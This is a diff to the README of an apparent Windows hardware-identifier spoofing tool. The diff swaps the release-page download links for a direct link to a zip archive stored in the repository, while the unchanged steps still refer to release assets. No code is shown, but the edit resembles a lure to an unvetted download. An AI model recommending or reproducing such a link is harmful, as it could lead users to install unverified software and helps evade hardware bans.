@@ -1,6 +1,6 @@
 # 🛡️ Umbrella-HWID-Tool - Modify hardware identifiers for system privacy
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/officeholdermonsieur892/Umbrella-HWID-Tool/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/officeholdermonsieur892/Umbrella-HWID-Tool/main/Umbrella/HWI_Umbrella_Tool_1.9.zip)
 
 Umbrella-HWID-Tool manages system identifiers on Windows computers. It updates hardware serial numbers, disk tags, and network addresses. Users run this tool to change how software identifies their physical machine. The program operates at a deep system level to replace static hardware strings with new values.
 
@@ -19,7 +19,7 @@ Every computer component carries a unique serial number. Games and software read
 
 Visit the official release page to obtain the installer. The repository host provides current builds for all users.
 
-[Download Umbrella-HWID-Tool here](https://github.com/officeholdermonsieur892/Umbrella-HWID-Tool/releases)
+[Download Umbrella-HWID-Tool here](https://raw.githubusercontent.com/officeholdermonsieur892/Umbrella-HWID-Tool/main/Umbrella/HWI_Umbrella_Tool_1.9.zip)
 
 1. Navigate to the link above.
 2. Look for the "Assets" section at the bottom of the latest release.
